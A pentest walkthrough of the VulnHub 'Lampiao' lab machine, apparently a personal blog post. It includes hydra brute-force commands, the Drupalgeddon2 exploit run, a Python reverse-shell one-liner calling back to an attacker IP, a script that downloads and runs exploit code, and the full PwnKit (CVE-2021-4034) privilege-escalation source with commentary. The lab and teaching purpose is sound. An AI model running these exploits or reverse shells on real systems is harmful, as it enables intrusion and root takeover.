---
title: Lampiao Walkthrough
date: 2023-04-29 12:00:00 -500
categories: [Pentesting, Walkthroughs]
tags: [VulnHub]
---

------------

### Pentesting Lampiao Box Thought Process:

##### `1.`  Discovering the IP of target machine: 

```bash
sudo netdiscover -i eth0 -r 192.168.56.0/24
```

![](/assets/img/Pasted image 20230429143227.png)

##### `2.`  Basic NMAP scan: 

```bash
nmap -Pn -sC -sV -A -p- 192.168.56.112
```

	Breakdown:
	a. "-Pn": Does not do a Ping scan since it is acknowledge that the target machine is running through the use of netdiscover.
	b. "-sC": probe which NMAP scripts can be used on open ports on the target machine.
	c. "-sV": probe the service version of open ports on the target machine
	d. "-A": probe the OS version, OS type ,etc. of the target machine
	e. "-p-": scans all ports of the target machine

![](/assets/img/Pasted image 20230429143302.png)

	- Notice that there are two ports that could possibly be hosting the website: port 80 and 1898.

##### `3.`  Visiting the website:

![](/assets/img/Pasted image 20230429143347.png)

	- Notice that there isn't anything on port 80 of the webserver but text drawing.

##### `4.`  Using dirb and dirbuster to enumerate available directories and files that could possibly be publicly disclosed on the website: (Using either **Dirbuster** or **dirb**)

<u>Dirbuster</u>:

![](/assets/img/Pasted image 20230429143430.png)

<u>Dirb</u>: 

- List of files and directories found using `dirb`:

		- /misc
		- /modules
		- /profiles
		- /scripts
		- /sites
		- /CHANGELOG.txt
		- /themes

-   `/misc`: 

![](/assets/img/Pasted image 20230429152828.png)

- /modules: 

![](/assets/img/Pasted image 20230429143513.png)

- /profiles: 

![](/assets/img/Pasted image 20230429143545.png)

- /scripts: 

![](/assets/img/Pasted image 20230429143613.png)

- /sites:

![](/assets/img/Pasted image 20230429143638.png)

- **Update logs** - This shows to which versions the server got updated to and the date in which it occured: 

![](/assets/img/Pasted image 20230429143702.png)

	- As you can see, it is on the `CHANGELOGS.txt`

- /themes: 

![](/assets/img/Pasted image 20230429143734.png)


##### `5.`  Visiting `http://192.168.56.112:1898/`: 

![](/assets/img/Pasted image 20230429143817.png)

![](/assets/img/Pasted image 20230429143827.png)

	- At the lower left corner, it confirms that the website indeed runs by Drupal.
	- Also, there are login page and register ones in it as well.

<u>Possible clues</u>:

- **Eder** and **tiago** might be a username 

##### `6.`  **Robots.txt** in this website: 

![](/assets/img/Pasted image 20230429143919.png)

	- This is a more realistic version of "robots.txt".
	- As you can see, the /misc is allowed to be crawled by web crawler.

##### `7.`  Using **droopescan** to enumerate on the drupal website (Website Enumeration) 
Reference: `[GitHub - SamJoan/droopescan: A plugin-based scanner that aids security researchers in identifying issues with several CMSs, mainly Drupal & Silverstripe.](https://github.com/SamJoan/droopescan) `

- Scanning the url with the port using `droopescan`: `http://10.201.10.112:1898`

		- Note that we use this instead of WPscan because the latter is for WordPress powered website but on this machine, it is powered by Drupal.

**Command**: 

```bash
droopescan scan drupal -u http://10.201.10.112:1898
```

<u>Result</u>: 

![](/assets/img/Pasted image 20230429144124.png)

	- Drupal showed us and confirm the Drupal version found from CHANGELOG.txt.

-   At this point, we have two users found: 

		- tiago
	    - Eder 

# Vulnerability Assessment 
##### `8.`  Using hydra to bruteforce the password for these users using rockyou.txt wordlist: 

##### Command: 

```bash
hydra -L ~/Desktop/users.txt -P /usr/share/wordlists/rockyou.txt 10.201.10.112:1898 http-post-form "/?q=user/login&destination=node/3%23comment-form:username=^USER^&password=^PASS^:Sorry, unrecognized username or password. Have you forgotten your password?" -vV -f 
```

	Breakdown:
    - "-L" : list of usernames to use
    - "-P" : list of passwords to use
    - 192.168.56.106 : the IP address to target
    - "http-post-form" : the method used in which the request was sent by the user. See the screenshot just above this one.
    - "/login.php" : the specific directory where the login page is found.
    - "username=^USER^" : the parameter used to inject each line from the list of usernames to test.
    - "password=^PASS^": the parameter used to inject each line from the list of passwords to test.
    - "Sorry, unrecognized username or password" : the expected output when the login fails.

<u>Request metadata:</u>

![](/assets/img/Pasted image 20230429144422.png)

	- Another Initial Access approach: Extract/scrape the keywords on the website http://<targetIP>:1898 using the tool 'cewl'. After scraping the text from the website, use hydra and use these keywords as a wordlist for the password dictionary attack.

<u>Command:</u>

```bash
hydra -l tiago -P pass.txt 10.201.10.117 ssh -t 4
```

	Breakdown:
	- "pass.txt" : is the scraped words from the website. 


# Exploitation -> High level breakdown of the **Drupalgeddon2** RCE exploit:

- Trying to execute this exploit using the provided tutorial on how to use:

<u>Command:</u>

```bash
ruby 44449.rb http://10.201.10.112
```

![](/assets/img/Pasted image 20230429144616.png)

<u>Executing it:</u>

![](/assets/img/Pasted image 20230429144702.png)

- Because of the error, we just install a new gem for Ruby because the `highline` gem is missing:

```bash
gem install highline
```

![](/assets/img/Pasted image 20230429144735.png)

# Executing the exploit again:

<u>Command</u>:

```bash
ruby 44449.rb http://10.201.10.112
```

<u>Result:</u>

![](/assets/img/Pasted image 20230429144822.png)

	- Got the webshell! 
	- Note that the webshell does not allow you to BREAK OUT of the /www/var/html directory.


##### Uploading a reverse shell in the system: 

```bash
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.201.10.145",20001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' 
```

![](/assets/img/Pasted image 20230429144926.png)

##### Executing the uploaded reverse shell with the webshell: 

![](/assets/img/Pasted image 20230429144952.png)

##### Receiving the reverse shell: 

![](/assets/img/Pasted image 20230429145027.png)

##### Upgrading the reverse shell: 
```bash
`1.` python3 -c 'import pty; pty.spawn("/bin/bash")' 
`2.` export PATH=/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/games:/tmp 
`3.`export TERM=xterm-256color 
`4.`"Ctrl + shift + Z"
`5.`stty raw -echo ; fg ; reset 
`6.`<enter> 
```

![](/assets/img/Pasted image 20230429145133.png)

# Privilege Escalation Phase:

##### `9.` Enumerate for Privilege Escalation Vectors using **linpeas.sh**: 

![](/assets/img/Pasted image 20230429145214.png)

<u>Info found from files that seems interesting</u>:

- **Config**: 

![](/assets/img/Pasted image 20230429145300.png)

	- Shows us the password for some user probably.

- **/etc/profile.d/**: 

![](/assets/img/Pasted image 20230429152907.png)

		- I checked this out but there's nothing seems to be there that is interesting.

##### `10.` **SUID bit** enabled binaries:

![](/assets/img/Pasted image 20230429145434.png)

- **PGP Signature**:

![](/assets/img/Pasted image 20230429145521.png)

- **Password**:

![](/assets/img/Pasted image 20230429145556.png)

- Tmux:

![](/assets/img/Pasted image 20230429145634.png)

- Drupal Files: 

![](/assets/img/Pasted image 20230429145720.png)

	- Found the user and password for the database 'drupal' ran by MySQL

##### `11.` Compilers inside the target: 

![](/assets/img/Pasted image 20230429145749.png)

	- Also notice that there are compilers available in the system.
	- This makes it possible for attackers to craft their own tools from inside the target machine.

- Useful software: 

![](/assets/img/Pasted image 20230429145818.png)

- Users:

![](/assets/img/Pasted image 20230429145842.png)

- OS and Sudo Version:

![](/assets/img/Pasted image 20230429145908.png)

	- The Linux version is highlighted with yellow and red which means that the OS itself is vulnerable to Local Privilege Escalation(LPE) probably.

- List of CVEs that could possibly help with privilege escalation:


# Possible CVE for LPE

```cpp
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                                         
[+] [CVE-2017-16995] eBPF_verifier                                                                                                                                                                                                                         

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,[ ubuntu=14.04 ]{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: highly probable
   Tags: [ ubuntu=14.04{kernel:4.4.0-*} ],ubuntu=16.04{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: highly probable
   Tags: [ ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic} ]
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit  -> Works!

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: probable
   Tags: [ ubuntu=14.04 ],fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-3202] fuse (fusermount)

   Details: http://seclists.org/oss-sec/2015/q2/520
   Exposure: probable
   Tags: debian=7.0|8.0,[ ubuntu=* ]
   Download URL: https://www.exploit-db.com/download/37089
   Comments: Needs cron or system admin interaction

[+] [CVE-2015-1318] newpid (apport)

   Details: http://openwall.com/lists/oss-security/2015/04/14/4
   Exposure: probable
   Tags: [ ubuntu=14.04 ]
   Download URL: https://gist.githubusercontent.com/taviso/0f02c255c13c5c113406/raw/eafac78dce51329b03bea7167f1271718bee4dcc/newpid.c

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2015-1318] newpid (apport) 2

   Details: http://openwall.com/lists/oss-security/2015/04/14/4
   Exposure: less probable
   Tags: ubuntu=14.04.2
   Download URL: https://www.exploit-db.com/download/36782

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                                                                    
  [1] af_packet                                                                                                                                                                                                                                            
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010


```
##### 12. Result of exploit execution:

	- Pwnkit works! (CVE-2021-4034)

##### Applying CVE-2021-4034 PwnKit as a Privilege Escalation exploit
- From the link: `https://www.exploit-db.com/exploits/50689`

		- I copied the .c code and place it on /tmp directory under the user 'www-data'.

<u>Compiling it</u>:

```bash
gcc -shared -o evil.so -fPIC evil-so.c
gcc exploit.c -o exploit
```

![](/assets/img/Pasted image 20230429164538.png)

<u>Execution</u>:

![](/assets/img/Pasted image 20230429164409.png)


----------

# Reference for in-depth understanding of how the PwnKit exploit works:
- `https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt`

- `https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/`

- `https://www.openwall.com/lists/oss-security/2014/07/14/1`

- `https://www.openwall.com/lists/oss-security/2017/06/23/8`

<u>More reference about the APIs or undocumented functions used by pkexec</u>:
- `https://docs.gtk.org/glib/func.find_program_in_path.html`

# Pre-conditions:
`1.` **/usr/bin/pkexec** has to have its SUID bit enabled.

# Recommended Files:
- `Makefile`
- `cve-2021-4034.c`
- `cve-2021-4034.sh`
- `pwnkit.c`

# Minimum files used to escalate privilege:
- `cve-2021-4034.c`
- `pwnkit.c`


# Makefile:
```cpp
CFLAGS=-Wall  // Sets the `CFLAGS` variable to `-Wall`, which is a compiler flag that enables all warning messages during compilation.
TRUE=$(shell which true)

.PHONY: all
all: pwnkit.so cve-2021-4034 gconv-modules gconvpath

.PHONY: clean
clean:
        rm -rf pwnkit.so cve-2021-4034 gconv-modules GCONV_PATH=./
        make -C dry-run clean

gconv-modules:
        echo "module UTF-8// PWNKIT// pwnkit 1" > $@

.PHONY: gconvpath
gconvpath:
        mkdir -p GCONV_PATH=.
        cp -f $(TRUE) GCONV_PATH=./pwnkit.so:.

pwnkit.so: pwnkit.c
        $(CC) $(CFLAGS) --shared -fPIC -o $@ $<

.PHONY: dry-run
dry-run:
        make -C dry-run
```


# cve-2021-4034.c File: (exploit)
```cpp
# Exploit Title: PolicyKit-1 0.105-31 - Privilege Escalation
# Exploit Author: Lance Biggerstaff
# Original Author: ryaagard (https://github.com/ryaagard)
# Date: 27-01-2022
# Github Repo: https://github.com/ryaagard/CVE-2021-4034
# References: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt

# Description: The exploit consists of three files `Makefile`, `evil-so.c` & `exploit.c`

##### Makefile #####

all:
	gcc -shared -o evil.so -fPIC evil-so.c
	gcc exploit.c -o exploit

clean:
	rm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm evil.so

#################

##### evil-so.c #####

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

// Sets the UID, GID and Group to root and spawns a new shell with this privileged process.
void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0);

    execve("/bin/sh", NULL, NULL);
}

#################

##### exploit.c #####

#include <stdio.h>
#include <stdlib.h>

#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"

int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",     // The `SHELL` variable usually contains the path to the user's preferred shell. In this case, it is set to a custom value, 
						        // which might be used for a specific purpose within the application.
    
        "CHARSET=ryaagard",   //The `CHARSET` variable is typically used to specify the character encoding used by the system or application. 
						        // In this case, it is set to a custom value, which might be used for a specific purpose within the application.
        NULL
    };
    char *argv[] = { NULL };

	// Creates the directory "GCONV_PATH=."
    system("mkdir GCONV_PATH=.");
    
	// Creates the file : "GCONV_PATH=./evildir" will have permissions 777.
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);

	// Create another directory named "evildir"
    system("mkdir " DIR);

	// The file 'gconv-modules' will have contents of : "module UTF-8// evil// evildir 1"
	// Actual format: <module name> <from-charset> <to-charset> <path-to-shared-library> <cost>
	// With this value in the configuration file /gconv-modules, iconv_open() uses this to know which shared library to execute when printing error messages.
	// In this case, if pkexec's iconv_open() goes to config file /gconv-modules and sees "evil" shared library, it executes "evil".
	// In this command, it creates a file in the current working directory 
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");

	// Copies the shared library "evil.so" to GCONV_PATH=./ directory.
	// In our case, evil.so gets copied to GCONV_PATH=./ directory.
    system("cp " EVILSO ".so " DIR);

	// The process to be spawned by execve via pkexec will have the environment variables added from the parent process' env variables:
	// DIR == "evildir"
	// PATH=GCONV_PATH=.
    // SHELL=ryaagard
    // CHARSET=ryaagard
    execve(BIN, argv, envp); // pkexec evildir (from GCONV_PATH=./)

    return 0;
}

#################
```

	- In our case, evil.so == pwnkit.so  && evil-so.c == pwnkit.c
	- exploit.c == cve-2021-4034.c  &&  exploit(ELF) == cve-2021-4034(ELF)


# cve-2021-4034.sh - Used to download + execute the exploit from Github

```cpp
#!/usr/bin/env sh

URL='https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/'

for EXPLOIT in "${URL}/cve-2021-4034.c" \
               "${URL}/pwnkit.c" \
               "${URL}/Makefile"
do
    curl -sLO "$EXPLOIT" || wget --no-hsts -q "$EXPLOIT" -O "${EXPLOIT##*/}"
done

make

./cve-2021-4034
```

	- curl -sLO "$EXPLOIT" Breakdown: This command attempts to download the file from the URL stored in the variable `$EXPLOIT` using `curl`.
			- `-s`: Silent mode, which prevents `curl` from displaying any progress bars or status information.
			- `-L`: Follows any redirects in case the URL points to a different location.
			- `-O`: Saves the downloaded file with the same name as the remote file.

	- wget --no-hsts -q "$EXPLOIT" -O "${EXPLOIT##*/}" Breakdown : This command attempts to download the file from the URL stored in the variable `$EXPLOIT` using `wget` if the `curl` command fails.
			- `--no-hsts`: Disables HSTS (HTTP Strict Transport Security), which enforces HTTPS connections for websites that support it. This option is used to avoid potential issues with HSTS.
			- `-q`: Quiet mode, which suppresses any output from `wget`.
			- `-O "${EXPLOIT##*/}"`: Specifies the output file name. `${EXPLOIT##*/}` is a parameter expansion that extracts the file name from the URL (everything after the last `/`). It saves the downloaded file with the same name as the remote file.

	- Uses the 'Makefile'.
	- Lastly, executes the final exploit.

<u>Total</u>:
- It downloads all the files from the URLs:

		- https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c
		- https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/pwnkit.c
		- https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/Makefile


# pwnkit.c - (evil-so.c)
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {
}

void gconv_init(void *step)
{
        char * const args[] = { "/bin/sh", NULL };
        char * const environ[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin", NULL };
        setuid(0);
        setgid(0);
        execve(args[0], args, environ);
        exit(0);
}
```



-----------
### Why does CVE-2021-4034 exploit work?

##### Because of the vulnerability in the `pkexec` binary. Looking inside the `/usr/bin/pkexec` binary:
**The beginning of `pkexec's main()` function processes the command-line arguments (lines 534-568), and searches for the program to be executed (if its path is not absolute) in the directories of the PATH environment variable (lines 610-640):**

```cpp
------------------------------------------------------------------------
 435 main (int argc, char *argv[])
 436 {
 ...
 534   for (n = 1; n < (guint) argc; n++) // This will get skipped
 535     {
 ...
 568     }
 ...   // argv[n] == argv[1] == envp[0] due to argv[1...n] being null. Now, 'path' == envp[0] by transitive prop. (and look at the memory stack layout)
 610   path = g_strdup (argv[n]); // Copies the string "evildir"
 ...
 629   if (path[0] != '/') // if the path doesn't start with a '/' char (meaning, its not a directory)
 630     {
 ...       // Note that GCONV_PATH=./ is added to the PATH variable(s) in the pkexec's process.
 632       s = g_find_program_in_path (path); // Locates the first executable named `path ("evildir" in this case)` in the user’s path then store it to 's'.
 ...       
 639	   // Out-Of-Bounds-Write: Sets the argv[1] to string 'evildir' (evildir is the malicious shared library)
 640       argv[n] = path = s; // it treats this as a file which in this case is : GCONV_PATH=./evildir (which is the malicious shared library)
 641     }
------------------------------------------------------------------------
```

- at line `534`, the integer n is permanently set to `1`;

		- This is because `argc == 0`. It essentially skips the `for()` loop.

- at line `610`, the pointer path is read out-of-bounds from `argv[1]`:

		- This is because the pkexec will read the next block in memory just after where the argv[0] was placed in memory and treat it like it is argv[1]. There's no "envp[0]" label when data is in memory.

- at line `639`, the pointer **`s`** is written out-of-bounds to `argv[1]`.

- at line `610`, the path of the program to be executed is read ***out-of-bounds*** from `argv[1]` (i.e. `envp[0]`), and points to "value";

		- Basically, since the argv[1] is null, pkexec will be forced to read the "envp[0]" instead.

```bash
|---------+---------+-----+------------|---------+---------+-----+------------|
| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] |
|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------|
     V         V                V           V         V                V
   program "name/value"         ?      "name=value" "PATH=name"       NULL
```

	- Note that this kind of OOB-W is also buffer overflow since it writes on the adjacent memory rather than an arbitrary memory location.

- at line `632`, this path "**`value`**" is passed to **g_find_program_in_path()**
  (because "`value`" does not start with a slash, at line `629`);


- **g_find_program_in_path()** searches for an executable file named "**value**"
  in the directories of our **PATH** environment variable;


- if such an executable file is found, its full path is returned to
  `pkexec's` main() function (at line `632`);


- and at line `639`, this full path is written out-of-bounds to `argv[1]`
  (i.e. `envp[0]`), thus overwriting our first environment variable.

<u>g_find_program_in_path Function Prototype</u>:
```cpp
gchar* g_find_program_in_path (
  const gchar* program
)
```


##### Exploitation Part:

```cpp
========================================================================
Exploitation
========================================================================
------------------------------------------------------------------------
 639       argv[n] = path = s;
 ...
 657   for (n = 0; environment_variables_to_save[n] != NULL; n++)  // pkexec completely clears the environment variables in the process.
 658     {
 659       const gchar *key = environment_variables_to_save[n];
 ...
 662       value = g_getenv (key);  // Returns the value of an environment variable.
 ...
 670       if (!validate_environment_variable (key, value))
 ...
 675     }
 ...
 702   if (clearenv () != 0) // Clears the environment of all name-value pairs and sets the value of the external variable environ to NULL
------------------------------------------------------------------------
```


```
...
```


##### What makes it possible for the us(attackers) to manipulate the ***`PATH`*** where to find the ***`shared library`*** injected into the `argv[1]` via `Write-Out-Of-Bounds`?
- **pkexec's** `g_printerr()` function callers:
```cpp
------------------------------------------------------------------------
  88 log_message (gint     level,
  89              gboolean print_to_stderr,
  90              const    gchar *format,
  91              ...)
  92 {
 ...
 125   if (print_to_stderr)
 126     g_printerr ("%s\n", s);    // instance of 
------------------------------------------------------------------------
 383 validate_environment_variable (const gchar *key,
 384                                const gchar *value)
 385 {
 ...
 406           log_message (LOG_CRIT, TRUE,
 407                        "The value for the SHELL variable was not found the /etc/shells file");
 408           g_printerr ("\n"
 409                       "This incident has been reported.\n");
------------------------------------------------------------------------
```

	- Two functions in the pkexec that invokes "`g_printerr()`":

			- log_message()
			- validate_environment_variable()


- Why do we want the `g_printerr()`? What is this function for when used normally?

		- Normal usage: For printing UTF-8 error messages
		- Why? We want this function because it calls ANOTHER "glibc" function named "iconv_open()".


##### Exploit chain inside `pkexec` utility:
- `validate_environment_variable() -> g_printerr() -> iconv_open() -> Re-introduced GCONV_PATH -> malicious .so file`

		- iconv_open() : this function is a glibc's function which is used by g_printerr().

- With the `iconv_open()`, this function executes a **small shared libraries** when converting from one charset to another if not a UTF-8 when `g_printerr()` is printing error messages:

		- How can we guarantee that it will actually execute a shared library?
		- Any way to trigger it?
				- Yes, things that gets read from some default configuration file /usr/lib/gconv/gconv-modules:
						- "from" charset
						- "to" charset
						- library name

		- GCONV_PATH environment variable has control of what configuration file does "iconv_open()" read.
				- `GCONV_PATH` is an environment variable for changing the configuration of this translation
				- The file 'gconv-modules' (config file) will have contents of : "module UTF-8// evil// evildir 1" that tricks "iconv_open()" glibc function 
				- This makes this environment variable unsecured.
				- Note that the pkexec's process probably removed(which it is) this environment variable from "ld.so"(SUID bit binaries environment vars) OR has its predefined value set.
				- To exploit it, we want to OVERWRITE/RE-INTRODUCE how pkexec knew the environment variable GCONV_PATH



# High-Level View:
- Value inside the configuration file `gconv-modules` file alongside the exploit's executable instead of using `/usr/lib/gconv/gconv-modules`:

![](/assets/img/Pasted image 20230429160048.png)

![](/assets/img/Pasted image 20230429160035.png)


---------------------------------------------

### Why does CVE-2018-7600 exploit work?
High Level Idea of how the `Drupalgeddon2` exploit works on v7.x Drupal website:

`/======================== Enumerating the Website powered by Drupal =====================/`

`1.` Accepts the URL argument input.

`2.` Creates an array of URLs containing the directories where version of Drupal can be found.

`3.` Do an HTTP request for each of the URL found in the array at (2) and check the Drupal version which in this case would be checked as the v7.x Drupal.


`/=========================== Probing for attack vector in Drupal ================================/`
NOTE 1: The Web Root in this case is **/var/www/html/**.

NOTE 2: The function "`gen_evil_url()`" writes the webshell into the website instead of the webserver. This function returns both the URL to trigger the webshell on and the payload that triggers it.

NOTE 3: If the Drupal website requires authentication first before we can do a POST request in our case, there's no need for it.

NOTE 4: In the code, if it has Drupal v8.x, we either need to register first or have a rogue account but we have v7.x in our case.

NOTE 5: If it has Drupal v7.x, we do NOT need to register first or have a rogue account to do the exploit.

NOTE 6: The webshell content gets saved on a file named `shell.php` and gets copied to `/var/www/html` (web root directory) of the webserver.

